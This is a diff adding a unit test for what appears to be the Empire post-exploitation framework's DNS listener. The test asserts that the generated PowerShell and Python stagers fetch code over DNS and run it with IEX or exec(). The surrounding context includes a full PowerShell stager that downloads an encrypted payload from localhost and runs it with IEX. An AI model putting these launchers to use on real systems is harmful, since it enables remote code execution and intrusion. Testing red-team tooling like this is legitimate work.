@@ -489,5 +489,44 @@ def _expected_redirector_python_launcher():
     ).strip("\n")
 
 
+def test_dns_generate_launcher(monkeypatch, main_menu_mock):
+    from empire.server.listeners.dns import Listener
+
+    # guarantee the routing packet content.
+    packets_mock = Mock()
+    packets_mock.build_routing_packet.return_value = b"routing packet"
+    monkeypatch.setattr("empire.server.listeners.dns.packets", packets_mock)
+
+    dns_listener = Listener(main_menu_mock)
+
+    dns_listener.options["Host"]["Value"] = "127.0.0.1"
+    dns_listener.options["Port"]["Value"] = "53"
+    dns_listener.options["StagingKey"]["Value"] = "2c103f2c4ed1e59c0b4e2e01821770fa"
+
+    powershell_launcher = dns_listener.generate_launcher(
+        language="powershell", encode=False
+    )
+
+    assert powershell_launcher is not None
+    assert '$Domain="127.0.0.1"' in powershell_launcher
+    assert 'Resolve-DnsName' in powershell_launcher
+    assert '-Server $Domain' in powershell_launcher
+    assert '-Type TXT' in powershell_launcher
+    assert '$Stage1' in powershell_launcher
+    assert 'IEX' in powershell_launcher
+
+    python_launcher = dns_listener.generate_launcher(
+        language="python", encode=False
+    )
+
+    assert python_launcher is not None
+    assert 'd="127.0.0.1"' in python_launcher
+    assert 'socket' in python_launcher
+    assert 'exec(' in python_launcher
+
+    # test that no language returns None
+    assert dns_listener.generate_launcher(language=None, encode=False) is None
+
+
 def _expected_redirector_powershell_launcher():
     return """$ErrorActionPreference = "SilentlyContinue";$wc=New-Object System.Net.WebClient;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.Headers.Add('User-Agent',$u);$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;$Script:Proxy = $wc.Proxy;$K=[System.Text.Encoding]::ASCII.GetBytes('@3uiSPNG;mz|{5#1tKCHDZ*dFs87~g,}');$ser=$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAAvAA==')));$t='/admin/get.php';$hop='fake_listener';$wc.Headers.Add('Hop-Name',$hop);$wc.Headers.Add("Cookie","session=cm91dGluZyBwYWNrZXQ=");$data=$wc.DownloadData($ser+$t);$iv=$data[0..3];$data=$data[4..$data.length];-join[Char[]](& $R $data ($IV+$K))|IEX"""
